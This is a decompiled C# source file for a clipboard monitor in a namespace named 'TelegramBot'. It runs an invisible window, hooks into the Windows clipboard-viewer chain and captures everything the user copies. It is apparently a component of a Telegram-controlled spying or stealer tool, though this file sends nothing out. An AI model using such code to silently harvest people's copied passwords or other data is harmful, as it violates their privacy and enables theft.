using System;
using System.Threading;
using System.Windows.Forms;

namespace TelegramBot
{
	// Token: 0x02000007 RID: 7
	public static class ClipboardMonitor
	{
		// Token: 0x14000001 RID: 1
		// (add) Token: 0x06000018 RID: 24 RVA: 0x0000382C File Offset: 0x00001A2C
		// (remove) Token: 0x06000019 RID: 25 RVA: 0x00003860 File Offset: 0x00001A60
		internal static event ClipboardMonitor.OnClipboardChangeEventHandler OnClipboardChange;

		// Token: 0x0600001A RID: 26 RVA: 0x0000219E File Offset: 0x0000039E
		public static void Start()
		{
			ClipboardMonitor.ClipboardWatcher.Start();
			ClipboardMonitor.ClipboardWatcher.OnClipboardChange += delegate(Enums.ClipboardFormat clipboardFormat, object data)
			{
				ClipboardMonitor.OnClipboardChangeEventHandler onClipboardChange = ClipboardMonitor.OnClipboardChange;
				if (onClipboardChange == null)
				{
					return;
				}
				onClipboardChange(clipboardFormat, data);
			};
		}

		// Token: 0x0600001B RID: 27 RVA: 0x000021C9 File Offset: 0x000003C9
		public static void Stop()
		{
			ClipboardMonitor.OnClipboardChange = null;
			ClipboardMonitor.ClipboardWatcher.Stop();
		}

		// Token: 0x02000008 RID: 8
		// (Invoke) Token: 0x0600001D RID: 29
		internal delegate void OnClipboardChangeEventHandler(Enums.ClipboardFormat clipboardFormat, object data);

		// Token: 0x02000009 RID: 9
		private class ClipboardWatcher : Form
		{
			// Token: 0x14000002 RID: 2
			// (add) Token: 0x06000020 RID: 32 RVA: 0x00003894 File Offset: 0x00001A94
			// (remove) Token: 0x06000021 RID: 33 RVA: 0x000038C8 File Offset: 0x00001AC8
			public static event ClipboardMonitor.ClipboardWatcher.OnClipboardChangeEventHandler OnClipboardChange;

			// Token: 0x06000022 RID: 34 RVA: 0x000038FC File Offset: 0x00001AFC
			public static void Start()
			{
				try
				{
					if (ClipboardMonitor.ClipboardWatcher.mInstance == null)
					{
						Thread thread = new Thread(delegate(object x)
						{
							Application.Run(new ClipboardMonitor.ClipboardWatcher());
						});
						thread.SetApartmentState(ApartmentState.STA);
						thread.Start();
					}
				}
				catch
				{
				}
			}

			// Token: 0x06000023 RID: 35 RVA: 0x00003958 File Offset: 0x00001B58
			public static void Stop()
			{
				try
				{
					ClipboardMonitor.ClipboardWatcher.mInstance.Invoke(new MethodInvoker(delegate()
					{
						DLLImport.ChangeClipboardChain(ClipboardMonitor.ClipboardWatcher.mInstance.Handle, ClipboardMonitor.ClipboardWatcher.nextClipboardViewer);
					}));
					ClipboardMonitor.ClipboardWatcher.mInstance.Invoke(new MethodInvoker(ClipboardMonitor.ClipboardWatcher.mInstance.Close));
					ClipboardMonitor.ClipboardWatcher clipboardWatcher = ClipboardMonitor.ClipboardWatcher.mInstance;
					if (clipboardWatcher != null)
					{
						clipboardWatcher.Dispose();
					}
					ClipboardMonitor.ClipboardWatcher.mInstance = null;
				}
				catch
				{
				}
			}

			// Token: 0x06000024 RID: 36 RVA: 0x000021D6 File Offset: 0x000003D6
			protected override void SetVisibleCore(bool value)
			{
				this.CreateHandle();
				ClipboardMonitor.ClipboardWatcher.mInstance = this;
				ClipboardMonitor.ClipboardWatcher.nextClipboardViewer = DLLImport.SetClipboardViewer(ClipboardMonitor.ClipboardWatcher.mInstance.Handle);
				base.SetVisibleCore(false);
			}

			// Token: 0x06000025 RID: 37 RVA: 0x000039D8 File Offset: 0x00001BD8
			protected override void WndProc(ref Message m)
			{
				int msg = m.Msg;
				if (msg == 776)
				{
					this.ClipChanged();
					DLLImport.SendMessage(ClipboardMonitor.ClipboardWatcher.nextClipboardViewer, m.Msg, m.WParam, m.LParam);
					return;
				}
				msg = m.Msg;
				if (msg != 781)
				{
					base.WndProc(ref m);
					return;
				}
				if (m.WParam != ClipboardMonitor.ClipboardWatcher.nextClipboardViewer)
				{
					DLLImport.SendMessage(ClipboardMonitor.ClipboardWatcher.nextClipboardViewer, m.Msg, m.WParam, m.LParam);
					return;
				}
				ClipboardMonitor.ClipboardWatcher.nextClipboardViewer = m.LParam;
			}

			// Token: 0x06000026 RID: 38 RVA: 0x00003A6C File Offset: 0x00001C6C
			private void ClipChanged()
			{
				IDataObject dataObject = Clipboard.GetDataObject();
				Enums.ClipboardFormat? clipboardFormat = null;
				foreach (string text in Enum.GetNames(typeof(Enums.ClipboardFormat)))
				{
					if (dataObject.GetDataPresent(text))
					{
						clipboardFormat = new Enums.ClipboardFormat?((Enums.ClipboardFormat)Enum.Parse(typeof(Enums.ClipboardFormat), text));
						break;
					}
				}
				object data = dataObject.GetData(clipboardFormat.ToString());
				if (data != null && clipboardFormat != null)
				{
					ClipboardMonitor.ClipboardWatcher.OnClipboardChangeEventHandler onClipboardChange = ClipboardMonitor.ClipboardWatcher.OnClipboardChange;
					if (onClipboardChange == null)
					{
						return;
					}
					onClipboardChange(clipboardFormat.Value, data);
				}
			}

			// Token: 0x04000009 RID: 9
			protected static ClipboardMonitor.ClipboardWatcher mInstance;

			// Token: 0x0400000A RID: 10
			private static IntPtr nextClipboardViewer;

			// Token: 0x0400000B RID: 11
			private const int WM_DRAWCLIPBOARD = 776;

			// Token: 0x0400000C RID: 12
			private const int WM_CHANGECBCHAIN = 781;

			// Token: 0x0200000A RID: 10
			// (Invoke) Token: 0x06000029 RID: 41
			internal delegate void OnClipboardChangeEventHandler(Enums.ClipboardFormat format, object data);
		}
	}
}
